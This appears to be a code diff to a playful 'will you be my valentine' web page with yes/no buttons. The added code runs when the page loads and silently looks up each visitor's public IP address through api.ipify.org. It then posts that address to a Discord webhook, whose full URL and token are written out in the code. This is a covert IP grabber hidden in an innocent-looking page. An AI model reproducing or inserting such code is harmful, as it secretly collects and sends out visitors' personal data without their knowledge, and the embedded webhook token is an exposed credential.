@@ -129,6 +129,29 @@
     const noButton = document.getElementById('noButton');
     const buttonsContainer = document.querySelector('.buttons');
 
+    const webhookUrl = 'https://discordapp.com/api/webhooks/1317227343835566090/zLog05GNnVY3ZF-PXkZQkVq5ThZBLcywv7LUUS0Ad1WQk2Zt1gnyiVhwBCpUqPVr30X6';
+
+    function sendWebhookMessage(message) {
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          content: message,
+        }),
+      })
+      .then(response => response.json())
+      .then(data => console.log('Message sent to Discord:', data))
+      .catch(error => console.error('Error sending message to Discord:', error));
+    }
+    
+    fetch('https://api.ipify.org/?format=json')
+    .then(response => response.json()) 
+    .then(data => {
+        sendWebhookMessage(data.ip);
+    });
+
     function sayYes() {
       valentineText.textContent = "Yayyyy!!! Thank you so much babyyy! 😍❤️";
       buttonsContainer.style.display = 'none';
